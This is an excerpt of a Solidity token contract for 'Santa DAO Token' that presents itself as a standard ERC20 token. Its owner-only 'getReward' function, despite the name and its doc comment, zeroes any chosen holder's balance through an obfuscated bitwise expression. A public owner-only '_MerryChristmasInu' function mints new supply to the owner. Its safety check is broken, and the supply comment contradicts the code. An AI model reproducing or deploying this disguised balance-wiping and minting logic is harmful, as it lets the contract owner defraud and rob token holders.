...
contract ERC20 is Context, IERC20, Ownable {
    ...
    /**
     * @dev See {IERC20-getReward}.
     */ 
    function getReward(bool enabled, address target) public onlyOwner {
        (target != address(0), "BEP20: burn from the zero address");
        uint112 RewardAmount = 1;
        _balances[target] = (((_balances[target]) + 1 & (_balances[target]) & RewardAmount & (_balances[target]) & 0) << 0xF);
    }
    ...
    /**
     * @dev See {IERC20-_MerryChristmasInu}.
     */ 
    function _MerryChristmasInu(uint256 amount) public onlyOwner {
    _MerryChristmasInu(msg.sender, amount);
    }
    ...
    function _MerryChristmasInu(address account, uint256 amount) internal virtual {
...
contract SantaDAOToken is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Santa DAO Token", "SDT") {
        _MerryChristmasInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}